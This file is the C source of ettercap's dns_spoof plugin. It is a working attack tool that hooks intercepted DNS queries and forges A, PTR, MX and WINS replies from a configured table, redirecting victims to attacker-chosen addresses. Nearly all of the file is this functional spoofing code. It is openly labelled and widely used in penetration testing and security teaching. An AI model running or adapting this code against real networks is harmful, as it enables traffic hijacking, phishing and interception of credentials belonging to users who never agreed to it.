/*
    dns_spoof -- ettercap plugin -- spoofs dns reply 

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_file.h>
#include <ec_hook.h>
#include <ec_resolv.h>
#include <ec_send.h>

#include <stdlib.h>
#include <string.h>

#ifndef ns_t_wins
#define ns_t_wins 0xFF01      /* WINS name lookup */
#endif

/* globals */

struct dns_header {
   u_int16 id;                /* DNS packet ID */
#ifdef WORDS_BIGENDIAN
   u_char  qr: 1;             /* response flag */
   u_char  opcode: 4;         /* purpose of message */
   u_char  aa: 1;             /* authoritative answer */
   u_char  tc: 1;             /* truncated message */
   u_char  rd: 1;             /* recursion desired */
   u_char  ra: 1;             /* recursion available */
   u_char  unused: 1;         /* unused bits */
   u_char  ad: 1;             /* authentic data from named */
   u_char  cd: 1;             /* checking disabled by resolver */
   u_char  rcode: 4;          /* response code */
#else /* WORDS_LITTLEENDIAN */
   u_char  rd: 1;             /* recursion desired */
   u_char  tc: 1;             /* truncated message */
   u_char  aa: 1;             /* authoritative answer */
   u_char  opcode: 4;         /* purpose of message */
   u_char  qr: 1;             /* response flag */
   u_char  rcode: 4;          /* response code */
   u_char  cd: 1;             /* checking disabled by resolver */
   u_char  ad: 1;             /* authentic data from named */
   u_char  unused: 1;         /* unused bits */
   u_char  ra: 1;             /* recursion available */
#endif
   u_int16 num_q;             /* Number of questions */
   u_int16 num_answer;        /* Number of answer resource records */
   u_int16 num_auth;          /* Number of authority resource records */
   u_int16 num_res;           /* Number of additional resource records */
};

struct dns_spoof_entry {
   int   type;   /* ns_t_a, ns_t_mx, ns_t_ptr, ns_t_wins */
   char *name;
   struct ip_addr ip;
   SLIST_ENTRY(dns_spoof_entry) next;
};

static SLIST_HEAD(, dns_spoof_entry) dns_spoof_head;

/* protos */

int plugin_load(void *);
static int dns_spoof_init(void *);
static int dns_spoof_fini(void *);
static int load_db(void);
static void dns_spoof(struct packet_object *po);
static int parse_line(const char *str, int line, int *type_p, char **ip_p, char **name_p);
static int get_spoofed_a(const char *a, struct ip_addr **ip);
static int get_spoofed_ptr(const char *arpa, char **a);
static int get_spoofed_mx(const char *a, struct ip_addr **ip);
static int get_spoofed_wins(const char *a, struct ip_addr **ip);
char *type_str(int type);
static void dns_spoof_dump(void);

/* plugin operations */

struct plugin_ops dns_spoof_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "dns_spoof",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Sends spoofed dns replies",  
   /* the plugin version. */ 
   .version =           "1.1",   
   /* activation function */
   .init =              &dns_spoof_init,
   /* deactivation function */                     
   .fini =              &dns_spoof_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   /* load the database of spoofed replies (etter.dns) 
    * return an error if we could not open the file
    */
   if (load_db() != ESUCCESS)
      return -EINVALID;
   
   dns_spoof_dump();
   return plugin_register(handle, &dns_spoof_ops);
}

/*********************************************************/

static int dns_spoof_init(void *dummy) 
{
   /* 
    * add the hook in the dissector.
    * this will pass only valid dns packets
    */
   hook_add(HOOK_PROTO_DNS, &dns_spoof);
   
   return PLUGIN_RUNNING;
}


static int dns_spoof_fini(void *dummy) 
{
   /* remove the hook */
   hook_del(HOOK_PROTO_DNS, &dns_spoof);

   return PLUGIN_FINISHED;
}


/*
 * load the database in the list 
 */
static int load_db(void)
{
   struct dns_spoof_entry *d;
   struct in_addr ipaddr;
   FILE *f;
   char line[128];
   char *ptr, *ip, *name;
   int lines = 0, type;
   
   /* open the file */
   f = open_data("etc", ETTER_DNS, FOPEN_READ_TEXT);
   if (f == NULL) {
      USER_MSG("Cannot open %s", ETTER_DNS);
      return -EINVALID;
   }
         
   /* load it in the list */
   while (fgets(line, 128, f)) {
      /* count the lines */
      lines++;

      /* trim comments */
      if ( (ptr = strchr(line, '#')) )
         *ptr = '\0';

      /* skip empty lines */
      if (!*line || *line == '\r' || *line == '\n')
         continue;
      
      /* strip apart the line */
      if (!parse_line(line, lines, &type, &ip, &name))
         continue;
        
      /* convert the ip address */
      if (inet_aton(ip, &ipaddr) == 0) {
         USER_MSG("%s:%d Invalid ip address\n", ETTER_DNS, lines);
         continue;
      }
        
      /* create the entry */
      SAFE_CALLOC(d, 1, sizeof(struct dns_spoof_entry));

      /* fill the struct */
      ip_addr_init(&d->ip, AF_INET, (u_char *)&ipaddr);
      d->name = strdup(name);
      d->type = type;

      /* insert in the list */
      SLIST_INSERT_HEAD(&dns_spoof_head, d, next);
   }
   
   fclose(f);

   return ESUCCESS;
}

/*
 * Parse line on format "<name> <type> <IP-addr>".
 */
static int parse_line (const char *str, int line, int *type_p, char **ip_p, char **name_p)
{
   static char name[100+1];
   static char ip[20+1];
   char type[10+1];

 DEBUG_MSG("%s:%d str '%s'", ETTER_DNS, line, str); 

   if (sscanf(str,"%100s %10s %20[^\r\n# ]", name, type, ip) != 3) {
      USER_MSG("%s:%d Invalid entry %s\n", ETTER_DNS, line, str);
      return (0);
   }

   if (!strcasecmp(type,"PTR")) {
      if (strpbrk(name,"*?[]")) {
         USER_MSG("%s:%d Wildcards in PTR records are not allowed; %s\n",
                  ETTER_DNS, line, str);
         return (0);
      }
      *type_p = ns_t_ptr;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type,"A")) {
      *type_p = ns_t_a;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type,"MX")) {
      *type_p = ns_t_mx;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type,"WINS")) {
      *type_p = ns_t_wins;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   USER_MSG("%s:%d Unknown record type %s\n", ETTER_DNS, line, type);
   return (0);
}

/*
 * parse the packet and send the fake reply
 */
static void dns_spoof(struct packet_object *po)
{
   struct dns_header *dns;
   u_char *data, *end;
   char name[NS_MAXDNAME];
   int name_len;
   u_char *q;
   int16 class;
   u_int16 type;

   dns = (struct dns_header *)po->DATA.data;
   data = (u_char *)(dns + 1);
   end = (u_char *)dns + po->DATA.len;
   
   /* extract the name from the packet */
   name_len = dn_expand((u_char *)dns, end, data, name, sizeof(name));
   
   q = data + name_len;
  
   /* get the type and class */
   NS_GET16(type, q);
   NS_GET16(class, q);
      
   /* handle only internet class */
   if (class != ns_c_in)
      return;

   /* we are interested only in DNS query */
   if ( (!dns->qr) && dns->opcode == ns_o_query && htons(dns->num_q) == 1 && htons(dns->num_answer) == 0) {

      /* it is and address resolution (name to ip) */
      if (type == ns_t_a) {
         
         struct ip_addr *reply;
         u_int8 answer[(q - data) + 16];
         u_char *p = answer + (q - data);
         char tmp[MAX_ASCII_ADDR_LEN];
         
         /* found the reply in the list */
         if (get_spoofed_a(name, &reply) != ESUCCESS)
            return;

         /* 
          * fill the buffer with the content of the request
          * we will append the answer just after the request 
          */
         memcpy(answer, data, q - data);
         
         /* prepare the answer */
         memcpy(p, "\xc0\x0c", 2);                        /* compressed name offset */
         memcpy(p + 2, "\x00\x01", 2);                    /* type A */
         memcpy(p + 4, "\x00\x01", 2);                    /* class */
         memcpy(p + 6, "\x00\x00\x0e\x10", 4);            /* TTL (1 hour) */
         memcpy(p + 10, "\x00\x04", 2);                   /* datalen */
         ip_addr_cpy(p + 12, reply);                      /* data */

         /* send the fake reply */
         send_dns_reply(po->L4.src, &po->L3.dst, &po->L3.src, po->L2.src, ntohs(dns->id), answer, sizeof(answer), 0);
         
         USER_MSG("dns_spoof: [%s] spoofed to [%s]\n", name, ip_addr_ntoa(reply, tmp));
         
      /* it is a reverse query (ip to name) */
      } else if (type == ns_t_ptr) {
         
         u_int8 answer[(q - data) + 256];
         char *a, *p = (char*)answer + (q - data);
         int rlen;
         
         /* found the reply in the list */
         if (get_spoofed_ptr(name, &a) != ESUCCESS)
            return;

         /* 
          * fill the buffer with the content of the request
          * we will append the answer just after the request 
          */
         memcpy(answer, data, q - data);
         
         /* prepare the answer */
         memcpy(p, "\xc0\x0c", 2);                        /* compressed name offset */
         memcpy(p + 2, "\x00\x0c", 2);                    /* type PTR */
         memcpy(p + 4, "\x00\x01", 2);                    /* class */
         memcpy(p + 6, "\x00\x00\x0e\x10", 4);            /* TTL (1 hour) */
         /* compress the string into the buffer */
         rlen = dn_comp(a, (u_char*)p + 12, 256, NULL, NULL);
         /* put the length before the dn_comp'd string */
         p += 10;
         NS_PUT16(rlen, p);

         /* send the fake reply */
         send_dns_reply(po->L4.src, &po->L3.dst, &po->L3.src, po->L2.src, ntohs(dns->id), answer, (q - data) + 12 + rlen, 0);
         
         USER_MSG("dns_spoof: [%s] spoofed to [%s]\n", name, a);
         
      /* it is an MX query (mail to ip) */
      } else if (type == ns_t_mx) {
         
         struct ip_addr *reply;
         u_int8 answer[(q - data) + 21 + 16];
         char *p = (char*)answer + (q - data);
         char tmp[MAX_ASCII_ADDR_LEN];
         
         /* found the reply in the list */
         if (get_spoofed_mx(name, &reply) != ESUCCESS)
            return;
         /* 
          * fill the buffer with the content of the request
          * we will append the answer just after the request 
          */
         memcpy(answer, data, q - data);
         
         /* prepare the answer */
         memcpy(p, "\xc0\x0c", 2);                          /* compressed name offset */
         memcpy(p + 2, "\x00\x0f", 2);                      /* type MX */
         memcpy(p + 4, "\x00\x01", 2);                      /* class */
         memcpy(p + 6, "\x00\x00\x0e\x10", 4);              /* TTL (1 hour) */
         memcpy(p + 10, "\x00\x09", 2);                     /* datalen */
         memcpy(p + 12, "\x00\x0a", 2);                     /* preference (highest) */
         /* 
          * add "mail." in front of the domain and 
          * resolve it in the additional record 
          */
         memcpy(p + 14, "\x04\x6d\x61\x69\x6c\xc0\x0c", 7); /* mx record */

         /* add the additional record */
         memcpy(p + 21, "\xc0\x28", 2);                     /* compressed name offset */
         memcpy(p + 23, "\x00\x01", 2);                     /* type A */
         memcpy(p + 25, "\x00\x01", 2);                     /* class */
         memcpy(p + 27, "\x00\x00\x0e\x10", 4);             /* TTL (1 hour) */
         memcpy(p + 31, "\x00\x04", 2);                     /* datalen */
         ip_addr_cpy((u_char*)p + 33, reply);                        /* data */
         
         /* send the fake reply */
         send_dns_reply(po->L4.src, &po->L3.dst, &po->L3.src, po->L2.src, ntohs(dns->id), answer, sizeof(answer), 1);
         
         USER_MSG("dns_spoof: MX [%s] spoofed to [%s]\n", name, ip_addr_ntoa(reply, tmp));

      /* it is an WINS query (NetBIOS-name to ip) */
      } else if (type == ns_t_wins) {

         struct ip_addr *reply;
         u_int8 answer[(q - data) + 16];
         char *p = (char*)answer + (q - data);
         char tmp[MAX_ASCII_ADDR_LEN];

         /* found the reply in the list */
         if (get_spoofed_wins(name, &reply) != ESUCCESS)
            return;
         /*
          * fill the buffer with the content of the request
          * we will append the answer just after the request
          */
         memcpy(answer, data, q - data);

         /* prepare the answer */
         memcpy(p, "\xc0\x0c", 2);                        /* compressed name offset */
         memcpy(p + 2, "\xff\x01", 2);                    /* type WINS */
         memcpy(p + 4, "\x00\x01", 2);                    /* class IN */
         memcpy(p + 6, "\x00\x00\x0e\x10", 4);            /* TTL (1 hour) */
         memcpy(p + 10, "\x00\x04", 2);                   /* datalen */
         ip_addr_cpy((u_char*)p + 12, reply);                      /* data */

         /* send the fake reply */
         send_dns_reply(po->L4.src, &po->L3.dst, &po->L3.src, po->L2.src, ntohs(dns->id), answer, sizeof(answer), 1);

         USER_MSG("dns_spoof: WINS [%s] spoofed to [%s]\n", name, ip_addr_ntoa(reply, tmp));
      }
   }
}


/*
 * return the ip address for the name
 */
static int get_spoofed_a(const char *a, struct ip_addr **ip)
{
   struct dns_spoof_entry *d;

   SLIST_FOREACH(d, &dns_spoof_head, next) {
      if (d->type == ns_t_a && match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;
         
         return ESUCCESS;
      }
   }
   
   return -ENOTFOUND;
}

/* 
 * return the name for the ip address 
 */
static int get_spoofed_ptr(const char *arpa, char **a)
{
   struct dns_spoof_entry *d;
   struct ip_addr ptr;
   int a0, a1, a2, a3;
   u_char ip[4];

   /* parses the arpa format */
   if (sscanf(arpa, "%d.%d.%d.%d.in-addr.arpa", &a3, &a2, &a1, &a0) != 4)
      return -EINVALID;

   /* reverse the order */
   ip[0] = a0 & 0xff; 
   ip[1] = a1 & 0xff; 
   ip[2] = a2 & 0xff; 
   ip[3] = a3 & 0xff;

   /* init the ip_addr structure */
   ip_addr_init(&ptr, AF_INET, ip);

   /* search in the list */
   SLIST_FOREACH(d, &dns_spoof_head, next) {
      /* 
       * we cannot return whildcards in the reply, 
       * so skip the entry if the name contains a '*'
       */
      if (d->type == ns_t_ptr && !ip_addr_cmp(&ptr, &d->ip)) {

         /* return the pointer to the name */
         *a = d->name;
         
         return ESUCCESS;
      }
   }
   
   return -ENOTFOUND;
}

/*
 * return the ip address for the name (MX records)
 */
static int get_spoofed_mx(const char *a, struct ip_addr **ip)
{
   struct dns_spoof_entry *d;

   SLIST_FOREACH(d, &dns_spoof_head, next) {
      if (d->type == ns_t_mx && match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;
         
         return ESUCCESS;
      }
   }
   
   return -ENOTFOUND;
}

/*
 * return the ip address for the name (NetBIOS WINS records)
 */
static int get_spoofed_wins(const char *a, struct ip_addr **ip)
{
   struct dns_spoof_entry *d;

   SLIST_FOREACH(d, &dns_spoof_head, next) {
      if (d->type == ns_t_wins && match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;

         return ESUCCESS;
      }
   }

   return -ENOTFOUND;
}

char *type_str (int type)
{
   return (type == ns_t_a    ? "A" :
           type == ns_t_ptr  ? "PTR" :
           type == ns_t_mx   ? "MX" :
           type == ns_t_wins ? "WINS" : "??");
}

static void dns_spoof_dump(void)
{
   struct dns_spoof_entry *d;

   DEBUG_MSG("dns_spoof entries:");
   SLIST_FOREACH(d, &dns_spoof_head, next) {
      if (ntohs(d->ip.addr_type) == AF_INET)
         DEBUG_MSG("  %s -> [%s], type %s", d->name, int_ntoa(d->ip.addr),
                   type_str(d->type));
      else
      {
         DEBUG_MSG("  %s -> ??", d->name);   /* IPv6 possible? */
      }
   }
}
   
/* EOF */

// vim:ts=3:expandtab

